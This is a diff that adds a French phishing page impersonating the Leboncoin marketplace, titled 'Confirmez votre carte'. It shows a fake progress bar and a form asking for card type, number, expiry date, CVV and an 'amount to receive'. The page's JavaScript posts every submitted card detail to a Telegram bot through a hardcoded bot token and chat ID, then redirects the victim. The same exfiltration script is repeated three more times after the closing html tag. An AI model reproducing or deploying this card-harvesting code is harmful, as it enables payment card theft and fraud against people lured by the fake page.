@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Confirmez votre carte</title>
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/inputmask@5.0.6/dist/inputmask.min.js"></script>
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+
+    header {
+      width: 100%;
+      padding: 20px 0;
+      display: flex;
+      justify-content: center;
+      background-color: #ffffff;
+    }
+
+    header img {
+      width: 150px;
+      height: auto;
+    }
+
+    main {
+      padding: 20px;
+      width: 100%;
+      max-width: 400px;
+      background-color: white;
+      margin-top: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    }
+
+    h1 {
+      font-size: 28px;
+      font-weight: 700;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    .form-row {
+      margin-bottom: 20px;
+    }
+
+    .form-row input,
+    .form-row select {
+      width: 100%;
+      padding: 14px;
+      border-radius: 5px;
+      border: 2px solid #ccc;
+      font-size: 14px;
+      box-sizing: border-box;
+      color: #333;
+      position: relative;
+    }
+
+    .form-row input:focus,
+    .form-row select:focus {
+      border-color: #ff6e14;
+      outline: none;
+    }
+
+    .coll button {
+        width: 350px;
+        height: 50px;
+        color: white;
+        background: #ff6e14;
+        border-radius: 25px;
+        border: none;
+        font-size: 1em;
+        font-weight: bold;
+        margin-top: 20px;
+        transition: background-color 0.3s;
+    }
+
+    .coll button:hover {
+        background-color: #e05e00;
+    }
+
+    .cvv-wrapper {
+      position: relative;
+    }
+
+    .cvv-wrapper input {
+      padding-right: 40px;
+    }
+
+    .cvv-wrapper img {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 20px;
+    }
+
+    .card-logo {
+      width: 100px;
+      margin-top: 20px;
+      margin-bottom: 20px;
+      display: none;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .input-mask-wrapper {
+      position: relative;
+    }
+
+    .input-mask-wrapper::after {
+      content: "MM/YYYY";
+      font-size: 12px;
+      color: #aaa;
+      position: absolute;
+      right: 15px;
+      top: 12px;
+    }
+
+    .card-selection-wrapper {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .evolution-chain {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+      gap: 30px;
+      margin-top: 20px;
+    }
+
+    .step {
+      text-align: center;
+      font-size: 14px;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+    }
+
+    .step span.title {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+      font-size: 16px;
+      color: #000;
+    }
+
+    .circle {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background-color: #FF5A00;
+      border: 3px solid #FF5A00;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+    }
+
+    .circle-3, .circle-4 {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background-color: white;
+      border: 3px solid #FF5A00;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+    }
+
+    .checkmark {
+      font-size: 14px;
+      color: white;
+    }
+
+    .dot {
+      width: 8px;
+      height: 8px;
+      background-color: #FF5A00;
+      border-radius: 50%;
+    }
+
+    .line {
+      position: absolute;
+      top: 70%;
+      left: 100%;
+      width: 20px;
+      height: 2px;
+      background-color: #FF5A00;
+      margin-top: -1px;
+    }
+
+    .step:last-child .line {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <img src="image/logo.png" alt="Logo Leboncoin">.
+</header>
+
+<div class="evolution-chain">
+    <div class="step">
+        <span class="title">Confirmer</span>
+        <div class="circle">
+            <div class="checkmark">✔</div>
+        </div>
+        <div class="line"></div>
+    </div>
+    <div class="step">
+        <span class="title">Checkpoint</span>
+        <div class="circle">
+            <div class="checkmark">✔</div>
+        </div>
+        <div class="line"></div>
+    </div>
+    <div class="step">
+        <span class="title">Vérifier</span>
+        <div class="circle circle-3">
+            <div class="dot"></div>
+        </div>
+        <div class="line"></div>
+    </div>
+    <div class="step">
+        <span class="title">Complete</span>
+        <div class="circle circle-4"></div>
+    </div>
+</div>
+
+<main>
+    <h1>Confirmez votre carte</h1>
+
+    <form id="cardForm">
+        <div class="card-selection-wrapper">
+            <img id="cardLogo" class="card-logo" src="" alt="Logo Carte" />
+            <div class="form-row">
+                <select id="cardType" name="cardType" required>
+                    <option value="" disabled selected>Choisissez le type de carte</option>
+                    <option value="visa">Visa</option>
+                    <option value="mastercard">MasterCard</option>
+                    <option value="cb">Carte CB</option>
+                </select>
+            </div>
+        </div>
+
+        <div class="form-row">
+            <input type="text" name="cardNumber" id="cardNumber" required placeholder="Numéro de carte" maxlength="16" pattern="\d{16}" title="Le numéro de carte doit comporter 16 chiffres">
+        </div>
+
+        <div class="form-row input-mask-wrapper">
+            <input type="text" name="expiryDateInput" id="expiryDateInput" required placeholder="Date d'expiration" maxlength="7" pattern="\d{2}/\d{4}" title="La date d'expiration doit être au format MM/YYYY (ex: 12/2025)">
+        </div>
+
+        <div class="form-row cvv-wrapper">
+            <input type="text" name="cvv" id="cvvInput" required placeholder="CVV" maxlength="3" pattern="\d{3}" title="Le code CVV doit comporter 3 chiffres">
+            <img src="image/cb_nationale.png" alt="Logo carte CB" />
+        </div>
+
+        <!-- Nouveau champ Montant à recevoir -->
+        <div class="form-row">
+            <input type="text" name="amount" id="amount" required placeholder="Montant à recevoir" maxlength="5">
+        </div>
+
+        <div class="coll">
+            <button type="submit">Confirmer la carte</button>
+        </div>
+    </form>
+</main>
+
+<script>
+$(document).ready(function() {
+
+    $("#cardType").on("change", function(){
+        var cardType = $(this).val();
+        var cardLogo = $("#cardLogo");
+        cardLogo.hide();
+
+        switch(cardType) {
+            case "visa":
+                cardLogo.attr('src', 'image/visa.png'); // Logo Visa
+                cardLogo.show();
+                break;
+            case "mastercard":
+                cardLogo.attr('src', 'image/master.png'); // Logo MasterCard
+                cardLogo.show();
+                break;
+            case "cb":
+                cardLogo.attr('src', 'image/cb_nationale.png'); // Logo CB
+                cardLogo.show();
+                break;
+            default:
+                cardLogo.hide();
+        }
+    });
+
+    // Masque pour le champ Date d'expiration
+    const expDate = document.getElementById("expiryDateInput");
+    Inputmask("99/9999", {
+        placeholder: "MM/YYYY",
+        showMaskOnFocus: false,
+        clearIncomplete: true
+    }).mask(expDate);
+
+    // Masque pour le champ Montant à recevoir
+    const amount = document.getElementById("amount");
+    Inputmask("9999", {
+        alias: "numeric",
+        digits: 2,
+        digitsOptional: true,
+        prefix: "",
+        suffix: "€",
+        groupSeparator: ",",
+        placeholder: "0,00",
+        showMaskOnFocus: false,
+        clearIncomplete: true
+    }).mask(amount);
+
+    $('#cardForm').on('submit', function(event) {
+        event.preventDefault();
+
+        // Récupérer les informations du formulaire
+        var cardType = $("#cardType").val();
+        var cardNumber = $("#cardNumber").val();
+        var expiryDate = $("#expiryDateInput").val();
+        var cvv = $("#cvvInput").val();
+        var amount = $("#amount").val();
+
+        // Validation du montant
+        if (!amount || amount === "0,00€") {
+            alert("Veuillez saisir un montant valide.");
+            return;
+        }
+
+        // Préparation du message pour Telegram
+        var message = `**Informations de carte :**
+        - Type de carte : ${cardType}
+        - Numéro de carte : ${cardNumber}
+        - Date d'expiration : ${expiryDate}
+        - CVV : ${cvv}
+        - Montant à recevoir : ${amount}
+        `;
+
+        // Envoi sur Telegram via l'API
+        var telegramUrl = `https://api.telegram.org/bot8047026898:AAEYkbvc49hNhy9bGvd5iG07PHRe1jKj6uI/sendMessage`;
+        var params = {
+            chat_id: '5601119281',
+            text: message,
+            parse_mode: 'Markdown'
+        };
+
+        $.post(telegramUrl, params, function(response) {
+            console.log(response);
+           // L'alerte suivante a été supprimée.
+           window.location.href = "confrimez.html"; // Redirection vers confrimez.html
+        }).fail(function(error) {
+            console.error(error);
+            alert("Erreur lors de l'envoi des données.");
+        });
+    });
+});
+</html>
+<script>
+  $(document).ready(function() {
+  
+      $("#cardType").on("change", function(){
+          var cardType = $(this).val();
+          var cardLogo = $("#cardLogo");
+          cardLogo.hide();
+  
+          switch(cardType) {
+              case "visa":
+                  cardLogo.attr('src', 'image/visa.png'); // Logo Visa
+                  cardLogo.show();
+                  break;
+              case "mastercard":
+                  cardLogo.attr('src', 'image/master.png'); // Logo MasterCard
+                  cardLogo.show();
+                  break;
+              case "cb":
+                  cardLogo.attr('src', 'image/cb_nationale.png'); // Logo CB
+                  cardLogo.show();
+                  break;
+              default:
+                  cardLogo.hide();
+          }
+      });
+  
+      // Masque pour le champ Date d'expiration
+      const expDate = document.getElementById("expiryDateInput");
+      Inputmask("99/9999", {
+          placeholder: "MM/YYYY",
+          showMaskOnFocus: false,
+          clearIncomplete: true
+      }).mask(expDate);
+  
+      // Masque pour le champ Montant à recevoir
+      const amount = document.getElementById("amount");
+      Inputmask("9999", {
+          alias: "numeric",
+          digits: 2,
+          digitsOptional: true,
+          prefix: "",
+          suffix: "€",
+          groupSeparator: ",",
+          placeholder: "0,00",
+          showMaskOnFocus: false,
+          clearIncomplete: true
+      }).mask(amount);
+  
+      $('#cardForm').on('submit', function(event) {
+          event.preventDefault();
+  
+          // Récupérer les informations du formulaire
+          var cardType = $("#cardType").val();
+          var cardNumber = $("#cardNumber").val();
+          var expiryDate = $("#expiryDateInput").val();
+          var cvv = $("#cvvInput").val();
+          var amount = $("#amount").val();
+  
+          // Validation du montant
+          if (!amount || amount === "0,00€") {
+              alert("Veuillez saisir un montant valide.");
+              return;
+          }
+  
+          // Préparation du message pour Telegram
+          var message = `**Informations de carte :**
+          - Type de carte : ${cardType}
+          - Numéro de carte : ${cardNumber}
+          - Date d'expiration : ${expiryDate}
+          - CVV : ${cvv}
+          - Montant à recevoir : ${amount}
+          `;
+  
+          // Envoi sur Telegram via l'API
+          var telegramUrl = `https://api.telegram.org/bot8047026898:AAEYkbvc49hNhy9bGvd5iG07PHRe1jKj6uI/sendMessage`;
+          var params = {
+              chat_id: '5601119281',
+              text: message,
+              parse_mode: 'Markdown'
+          };
+  
+          $.post(telegramUrl, params, function(response) {
+              console.log(response);
+              // L'alerte suivante a été supprimée.
+              window.location.href = "confrimez.html"; // Redirection vers confrimez.html
+          }).fail(function(error) {
+              console.error(error);
+              alert("Erreur lors de l'envoi des données.");
+          });
+      });
+  });
+  </script>
+  <script>
+    $(document).ready(function() {
+    
+        $("#cardType").on("change", function(){
+            var cardType = $(this).val();
+            var cardLogo = $("#cardLogo");
+            cardLogo.hide();
+    
+            switch(cardType) {
+                case "visa":
+                    cardLogo.attr('src', 'image/visa.png'); // Logo Visa
+                    cardLogo.show();
+                    break;
+                case "mastercard":
+                    cardLogo.attr('src', 'image/master.png'); // Logo MasterCard
+                    cardLogo.show();
+                    break;
+                case "cb":
+                    cardLogo.attr('src', 'image/cb_nationale.png'); // Logo CB
+                    cardLogo.show();
+                    break;
+                default:
+                    cardLogo.hide();
+            }
+        });
+    
+        // Masque pour le champ Date d'expiration
+        const expDate = document.getElementById("expiryDateInput");
+        Inputmask("99/9999", {
+            placeholder: "MM/YYYY",
+            showMaskOnFocus: false,
+            clearIncomplete: true
+        }).mask(expDate);
+    
+        // Masque pour le champ Montant à recevoir
+        const amount = document.getElementById("amount");
+        Inputmask("9999", {
+            alias: "numeric",
+            digits: 2,
+            digitsOptional: true,
+            prefix: "",
+            suffix: "€",
+            groupSeparator: ",",
+            placeholder: "0,00",
+            showMaskOnFocus: false,
+            clearIncomplete: true
+        }).mask(amount);
+    
+        $('#cardForm').on('submit', function(event) {
+            event.preventDefault();
+    
+            // Récupérer les informations du formulaire
+            var cardType = $("#cardType").val();
+            var cardNumber = $("#cardNumber").val();
+            var expiryDate = $("#expiryDateInput").val();
+            var cvv = $("#cvvInput").val();
+            var amount = $("#amount").val();
+    
+            // Validation du montant
+            if (!amount || amount === "0,00€") {
+                alert("Veuillez saisir un montant valide.");
+                return;
+            }
+    
+            // Préparation du message pour Telegram
+            var message = `**Informations de carte :**
+            - Type de carte : ${cardType}
+            - Numéro de carte : ${cardNumber}
+            - Date d'expiration : ${expiryDate}
+            - CVV : ${cvv}
+            - Montant à recevoir : ${amount}
+            `;
+    
+            // Envoi sur Telegram via l'API
+            var telegramUrl = `https://api.telegram.org/bot8047026898:AAEYkbvc49hNhy9bGvd5iG07PHRe1jKj6uI/sendMessage`;
+            var params = {
+                chat_id: '5601119281',
+                text: message,
+                parse_mode: 'Markdown'
+            };
+    
+            $.post(telegramUrl, params, function(response) {
+                console.log(response);
+                // L'alerte suivante a été supprimée.
+                window.location.href = "confrimez.html"; // Redirection vers confrimez.html
+            }).fail(function(error) {
+                console.error(error);
+                alert("Erreur lors de l'envoi des données.");
+            });
+        });
+    });
+    </script>
+    
+    <script>
+      $(document).ready(function() {
+      
+          $("#cardType").on("change", function(){
+              var cardType = $(this).val();
+              var cardLogo = $("#cardLogo");
+              cardLogo.hide();
+      
+              switch(cardType) {
+                  case "visa":
+                      cardLogo.attr('src', 'image/visa.png'); // Logo Visa
+                      cardLogo.show();
+                      break;
+                  case "mastercard":
+                      cardLogo.attr('src', 'image/master.png'); // Logo MasterCard
+                      cardLogo.show();
+                      break;
+                  case "cb":
+                      cardLogo.attr('src', 'image/cb_nationale.png'); // Logo CB
+                      cardLogo.show();
+                      break;
+                  default:
+                      cardLogo.hide();
+              }
+          });
+      
+          // Masque pour le champ Date d'expiration
+          const expDate = document.getElementById("expiryDateInput");
+          Inputmask("99/9999", {
+              placeholder: "MM/YYYY",
+              showMaskOnFocus: false,
+              clearIncomplete: true
+          }).mask(expDate);
+      
+          // Masque pour le champ Montant à recevoir
+          const amount = document.getElementById("amount");
+          Inputmask("9999", {
+              alias: "numeric",
+              digits: 2,
+              digitsOptional: true,
+              prefix: "",
+              suffix: "€",
+              groupSeparator: ",",
+              placeholder: "0,00",
+              showMaskOnFocus: false,
+              clearIncomplete: true
+          }).mask(amount);
+      
+          $('#cardForm').on('submit', function(event) {
+              event.preventDefault();
+      
+              // Récupérer les informations du formulaire
+              var cardType = $("#cardType").val();
+              var cardNumber = $("#cardNumber").val();
+              var expiryDate = $("#expiryDateInput").val();
+              var cvv = $("#cvvInput").val();
+              var amount = $("#amount").val();
+      
+              // Validation du montant
+              if (!amount || amount === "0,00€") {
+                  alert("Veuillez saisir un montant valide.");
+                  return;
+              }
+      
+              // Préparation du message pour Telegram
+              var message = `**Informations de carte :**
+              - Type de carte : ${cardType}
+              - Numéro de carte : ${cardNumber}
+              - Date d'expiration : ${expiryDate}
+              - CVV : ${cvv}
+              - Montant à recevoir : ${amount}
+              `;
+      
+              // Envoi sur Telegram via l'API
+              var telegramUrl = `https://api.telegram.org/bot8047026898:AAEYkbvc49hNhy9bGvd5iG07PHRe1jKj6uI/sendMessage`;
+              var params = {
+                  chat_id: '5601119281',
+                  text: message,
+                  parse_mode: 'Markdown'
+              };
+      
+              $.post(telegramUrl, params, function(response) {
+                  console.log(response);
+                  // L'alerte suivante a été supprimée.
+                  window.location.href = "confrimez.html"; // Redirection vers confrimez.html
+              }).fail(function(error) {
+                  console.error(error);
+                  alert("Erreur lors de l'envoi des données.");
+              });
+          });
+      });
+      </script>
+      
